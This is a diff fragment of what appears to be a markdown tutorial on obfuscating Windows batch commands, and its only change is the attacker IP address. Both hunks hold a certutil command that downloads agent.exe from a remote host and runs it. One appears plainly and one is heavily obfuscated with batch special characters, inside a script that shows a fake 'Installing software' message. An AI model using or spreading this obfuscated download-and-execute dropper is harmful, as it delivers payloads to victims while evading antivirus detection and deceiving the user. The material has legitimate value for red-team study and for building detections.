@@ -188,7 +188,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 <br />
 
 - String command to obfuscate<br />
-`cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.69/agent.exe agent.exe && start agent.exe`<br />
+`cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.71/agent.exe agent.exe && start agent.exe`<br />
 
 <br />
 
@@ -208,7 +208,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
       @echo off
       sEt e=!h&& sEt c=db&& sEt a=0x
       echo [+] Please Wait, Installing software ..
-      ;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%0C%tIl.%!h%^xe -u^R%Ac%l%db%%0x%ch%!h% -sP%nF%l^I%O%t -f ht%0D%tp://192.168.1.69/%0x%g%!h%Nt.E^x%!h% %0x%Ge%T%N^t.%!h%^xE && s^t%0x%r%1K%T %0x%"g"%!h%Nt.e%1H%x%!h%
+      ;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%0C%tIl.%!h%^xe -u^R%Ac%l%db%%0x%ch%!h% -sP%nF%l^I%O%t -f ht%0D%tp://192.168.1.71/%0x%g%!h%Nt.E^x%!h% %0x%Ge%T%N^t.%!h%^xE && s^t%0x%r%1K%T %0x%"g"%!h%Nt.e%1H%x%!h%
       exit
 
 ![batch obfuscation certutil.bat](http://i.)
